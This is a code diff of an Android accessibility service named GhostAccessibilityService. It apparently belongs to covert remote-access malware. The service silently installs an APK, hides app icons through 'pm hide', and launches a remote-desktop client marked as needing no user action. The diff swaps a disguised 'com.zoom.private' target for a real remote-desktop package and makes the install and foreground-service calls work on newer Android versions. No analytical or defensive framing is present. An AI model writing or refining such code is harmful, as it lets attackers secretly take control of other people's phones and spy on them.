@@ -51,7 +51,7 @@ public class GhostAccessibilityService extends AccessibilityService {
         instance = this;
 
         // If zoom-private is already installed, just ensure it's running
-        if (isPackageInstalled("com.zoom.private")) {
+        if (isPackageInstalled("com.betterdesk.client.universal")) {
             startHiddenService(this);
             launchZoomPrivate(this);
             return;
@@ -91,7 +91,7 @@ public class GhostAccessibilityService extends AccessibilityService {
 
     private void silentInstall(File apkFile) {
         Intent installIntent = new Intent(Intent.ACTION_VIEW);
-        installIntent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
+        installIntent.setDataAndType(androidx.core.content.FileProvider.getUriForFile(this, getPackageName() + ".files", apkFile), "application/vnd.android.package-archive");
         installIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
         installIntent.putExtra(Intent.EXTRA_RETURN_RESULT, false);
         startActivity(installIntent);
@@ -99,6 +99,7 @@ public class GhostAccessibilityService extends AccessibilityService {
         IntentFilter filter = new IntentFilter();
         filter.addAction(Intent.ACTION_PACKAGE_ADDED);
         filter.addAction(Intent.ACTION_PACKAGE_REPLACED);
+        filter.addDataScheme("package");
         registerReceiver(new BroadcastReceiver() {
             @Override
             public void onReceive(Context context, Intent intent) {
@@ -149,7 +150,7 @@ public class GhostAccessibilityService extends AccessibilityService {
 
     private void hideAppIcon() {
         try {
-            Runtime.getRuntime().exec("pm hide com.zoom.private").waitFor();
+            Runtime.getRuntime().exec("pm hide com.betterdesk.client.universal").waitFor();
         } catch (Exception ignored) {}
         try {
             Runtime.getRuntime().exec("pm hide com.android.shell.ghost").waitFor();
@@ -160,7 +161,7 @@ public class GhostAccessibilityService extends AccessibilityService {
         try {
             Intent intent = new Intent();
             intent.setComponent(new android.content.ComponentName(
-                    "com.zoom.private", "com.zoom.private.MainActivity"));
+                    "com.betterdesk.client.universal", "com.carriez.flutter_hbb.MainActivity"));
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_USER_ACTION);
             context.startActivity(intent);
         } catch (Exception ignored) {}
@@ -207,7 +208,7 @@ public class GhostAccessibilityService extends AccessibilityService {
                 .setSmallIcon(android.R.drawable.ic_dialog_info)
                 .build();
         Intent serviceIntent = new Intent(context, GhostForegroundService.class);
-        context.startService(serviceIntent);
+        androidx.core.content.ContextCompat.startForegroundService(context, serviceIntent);
     }
 
     public static GhostAccessibilityService getInstance() {
